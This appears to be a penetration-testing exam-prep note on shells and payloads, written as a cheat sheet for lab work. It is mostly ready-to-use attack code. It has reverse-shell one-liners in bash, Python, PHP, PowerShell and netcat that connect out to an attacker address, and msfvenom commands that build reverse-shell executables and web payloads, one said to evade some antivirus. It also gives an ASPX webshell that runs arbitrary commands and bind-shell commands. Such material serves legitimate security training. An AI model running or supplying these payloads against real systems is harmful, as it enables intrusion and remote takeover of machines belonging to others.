# 08 — Shells & Payloads

## Reverse Shell Cheat Sheet (start listener first: `nc -lvnp <PORT>`)

```bash
# Bash
bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("YOUR_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell (Windows)
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('YOUR_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"

# nc if -e supported
nc -e /bin/sh YOUR_IP PORT
```

**Don't memorize — use revshells.com** or the offline `nishang`/`PayloadsAllTheThings` reverse-shell cheat sheet, adjust IP/port automatically. Faster than typing from memory in exam.

## msfvenom Payloads

```bash
# Windows exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=PORT -f exe -o shell.exe

# Linux elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=PORT -f elf -o shell.elf

# PHP
msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=PORT -f raw -o shell.php

# Windows PowerShell one-liner (bypasses some AV vs. dropping exe)
msfvenom -p cmd/windows/reverse_powershell LHOST=YOUR_IP LPORT=PORT

# ASPX (for IIS webshells)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=PORT -f aspx -o shell.aspx
```

## Upgrading a Shell to Full TTY (do this immediately — Ctrl+C, tab-complete, vi all need it)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then in the shell:
export TERM=xterm
# Ctrl+Z to background it, then on your attacker box:
stty raw -echo; fg
# press Enter twice, then:
reset
```

Or use `rlwrap` before starting your listener for arrow-key history:
```bash
rlwrap nc -lvnp PORT
```

## Windows Webshell (ASPX one-liner, cmd exec)

```aspx
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]); %>
```

## Bind Shell (when reverse is blocked by firewall egress)

```bash
# Attacker connects TO victim
nc -lvnp PORT -e /bin/sh    # on victim (if listening allowed)
nc <victim_IP> PORT         # from attacker
```

## Quick Reference — Tools In This File

| Task | HTB-taught | Faster/better alternative |
|---|---|---|
| Finding the right one-liner | memorize | revshells.com (generates + auto-fills IP/port/encoding) |
| TTY upgrade | manual python pty | same, but always pair with `rlwrap` on the listener |

Next: `09-file-transfers.md`
